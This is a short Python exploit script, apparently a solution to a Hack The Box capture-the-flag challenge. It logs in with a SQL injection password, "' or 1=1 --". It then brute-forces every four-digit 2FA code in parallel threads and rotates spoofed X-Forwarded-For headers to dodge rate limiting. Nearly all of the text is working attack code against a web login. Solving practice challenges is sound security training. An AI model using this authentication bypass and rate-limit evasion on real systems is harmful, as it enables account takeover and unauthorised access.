import requests
import re
import random
import threading
from concurrent.futures import ThreadPoolExecutor

challenge_ip = "83.136.254.163:40239"
terminate_threads = False


def auth():
    s = requests.Session()
    req = requests.Request(method='POST', url=f"http://{challenge_ip}/auth/./login", data={'username':'admin', 'password':"' or 1=1 --"})
    prep =  req.prepare()
    prep.url = f"http://{challenge_ip}/auth/./login"
    response = s.send(prep, verify=False)
    return s

def generate_pins():
    pins = [f"{i:04}\n" for i in range(10000)]
    random.shuffle(pins)
    with open("pins.txt", "w") as file:
        file.writelines(pins)

def crack_code():
    pins = open("pins.txt","r").readlines()
    ips = open("ips.txt","r").readlines()

    session = auth()
    count = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        threads = []
        for pin in pins:
            future = executor.submit(crack_pin, session, pin.strip(), ips[count//20].strip())
            futures.append(future)
            count+=1

        for future in futures:
            response = future.result()
            if "Invalid" not in response.text:
                flag = re.search("HTB{.*}",session.get(f"http://{challenge_ip}/dashboard").text)
                if flag != None:
                    print(f"Congratulations! Flag: {flag.group(0)}")
                    terminate_threads = True  # imposta il segnale di terminazione per fermare tutti i thread
                    for t in threads:
                        t.join()
                    executor.shutdown()
                    exit(0)

        executor.shutdown()  # termina executor in modo normale al termine di tutti i lavori

def crack_pin(session, pin, ip):
    response = session.post(f"http://{challenge_ip}/auth/verify-2fa", data={'2fa-code': pin}, headers={'X-Forwarded-For':ip})#, proxies={'http':'127.0.0.1:8080','https':'127.0.0.1:8080'})
    return response

#generate_pins()
crack_code()

